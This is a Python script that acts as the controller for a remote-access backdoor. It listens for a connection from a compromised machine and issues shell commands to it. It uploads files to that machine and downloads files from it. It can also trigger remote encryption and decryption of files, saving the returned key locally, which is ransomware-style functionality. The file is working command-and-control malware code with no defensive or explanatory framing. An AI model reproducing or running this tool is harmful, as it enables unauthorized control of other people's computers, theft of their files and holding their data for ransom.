import socket
import os
import sys
SERVER_HOST = "10.0.0.3"
SERVER_PORT = int(sys.argv[1])
print(SERVER_PORT)



data = ""
l = ""
print("Welcome to the Shell! \n For help type 'help'")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(1)
client_socket, client_address = s.accept()

d = client_socket.recv(1024).decode()
hostname = d.split(" ")[0]
path = d.split(" ")[1]


while True:
    # get the command from prompt
    cmd = input(str(client_address[0] + ":" + hostname + ": " + path + " > "))
    if cmd == "Exit":
        command = client_socket.send(cmd.encode())
        break
    if (cmd[0:6] == "upload"):
        if (len(cmd.split(" ")) == 3):
            flag = False
            if cmd.split(" ")[1] == '-f':
                file = cmd.split(" ")[2]
                if (os.path.isfile(file)):
                    flag = True
                if (flag):
                    print(file)
                    f_name = file.split("\\")[len(file.split("\\")) - 1]
                    place = input('Where do you want to save the  file? [Press D for the current working directory] ')
                    client_socket.send(str('Upload ' + place + " " + f_name).encode())
                    ans = client_socket.recv(1024)
                    while (ans == 'INVALID'):
                        print("Invalid path!")
                        place = input( 'Where do you want to save the  file? [Press D for the current working directory]')
                        client_socket.send(str('Upload' + place + " " + f_name).encode())
                    f1 = ""
                    file = open(file, 'rb')
                    f1 = file.read(1024)
                    while f1:
                        print(f1)
                        client_socket.send(f1)
                        f1 = file.read(1024)
                    client_socket.send('EOF'.encode())
                    msg = client_socket.recv(1024).decode()
                    print(msg)
                    continue
                else:
                    print("File/path is invalid")
                    continue

            elif cmd.split(" ")[1] == '-d':
                dir = command.split(" ")[2]
                if (os.path.isdir(dir)):
                    flag = True
                if (flag):
                    pass

            else:
                print("Invalid arguments")
                continue
        else:
            print("the command expect 2 arguments! But only " + str(len(cmd.split(" ")) -1 ) + " were given")
            continue
    else:
        command = client_socket.send(cmd.encode())



    result = client_socket.recv(16834).decode()



    if result.split(' ')[0] == 'PATH':
        path = result.split(" ")[1]

    elif result == 'DOWNLOAD':
        name = cmd[9:]
        while True:
            path1 = input("Where do you want to save the file? ")
            if(os.path.isdir(path1)):
                break
            print("Invalid path! please enter it correctly")
        file = open(path1 + "\\" + name, 'wb')
        print(name)
        while True:
            l = client_socket.recv(1024)
            file.write(l)
            print("\n" + l.decode())
            if 'EOF' in l.decode():
                break
        print("Ok")
        file.close()

    elif (result == 'encrypt'):
        print(client_socket.recv(1024).decode())
        ch = input("Do you want to save the Key as a file? [Y/N] ")
        if str(ch) == 'Y':
            client_socket.send("YES".encode())
            data = client_socket.recv(1024).decode()
            file = open("Info.txt", 'w')
            file.write(data)
            file.close()
            print("The key has been saved in this path: " + os.path.abspath(os.getcwd()) + "\\Info.txt")
        else:
            client_socket.send("NO".encode())
            print("\n\n")

    elif (result == 'decrypt'):
        ch = input("Please enter your decryption key: ")
        client_socket.send(ch.encode())
        dec_file = client_socket.recv(1024).decode()
        print("The filed have been decrypted, and saved as: " + dec_file)



    else:
        print(result)









# close server connection
s.close()